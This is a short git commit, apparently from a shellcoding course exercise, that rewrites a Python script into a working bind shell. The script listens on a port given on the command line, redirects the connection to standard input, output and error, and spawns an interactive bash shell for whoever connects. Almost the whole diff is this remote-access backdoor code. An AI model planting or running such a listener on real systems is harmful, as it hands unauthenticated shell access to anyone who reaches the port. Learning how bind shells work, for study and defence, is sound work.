409d170e07f65d7ca992f1145cd78c94897cbc07
SLAE <troykkt@gmail.com>
2016-06-24 16:50:33 -0400

    finally got bind_tcp.py to work :D

--- bind_tcp.py
+++ bind_tcp.py
@@ -2,17 +2,21 @@
 
 import socket
 import os
-
-
+import sys
+import subprocess
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-s.bind(('',4444))
+s.bind(('',int(sys.argv[1])))
+
 
 s.listen(10)
 
 while 1:
     connection,address = s.accept()
     data = connection.recv(1024)
-    os.execve('/bin/ls',None,None)
+    os.dup2(connection.fileno(),0)
+    os.dup2(connection.fileno(),1)
+    os.dup2(connection.fileno(),2)
+    subprocess.call(['/bin/bash','-i'])
